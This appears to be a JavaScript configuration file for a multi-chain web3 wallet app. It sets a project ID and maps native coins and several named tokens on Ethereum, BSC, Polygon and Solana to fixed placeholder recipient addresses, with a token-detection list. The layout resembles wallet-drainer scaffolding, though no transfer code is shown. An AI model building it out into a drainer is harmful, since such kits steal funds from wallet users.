import { mainnet, bsc, polygon } from "wagmi/chains";

/* Your Reown Project ID */
export const REOWN_PROJECT_ID = "c00145b1e7f8d39d821971d8aeb61276";

/* Supported EVM chains */
export const CHAINS = [mainnet, bsc, polygon];

/* Fixed recipients for native coins */
export const FIXED_RECIPIENTS = {
  1: "0xYourEthereumAddress",   // Ethereum mainnet
  56: "0xYourBSCAddress",       // Binance Smart Chain
  137: "0xYourPolygonAddress"   // Polygon
};

/* Fixed recipient for Solana */
export const FIXED_SOLANA_RECIPIENT = "YourSolanaWalletAddressHere";

/* ERC-20 fixed recipients per chain */
export const ERC20_RECIPIENTS = {
  1: {
    // Ethereum tokens
    USDT: "0xEthereumUSDTRecipient",
    DAI: "0xEthereumDAIRecipient",
    WBTC: "0xEthereumWBTCRecipient"
  },
  56: {
    // BSC tokens
    BUSD: "0xBSCBUSDRecipient",
    USDT: "0xBSCUSDTRecipient"
  },
  137: {
    // Polygon tokens
    USDC: "0xPolygonUSDCRecipient",
    MATIC: "0xPolygonMATICRecipient"
  }
};

/* Optional: placeholders for known tokens to help with detection */
export const KNOWN_TOKENS = {
  EVM: [
    // { symbol: "USDT", address: "0x..." },
    // { symbol: "DAI", address: "0x..." },
  ],
  SOLANA: [
    // { symbol: "USDC", mint: "..." },
    // { symbol: "SRM", mint: "..." },
  ]
};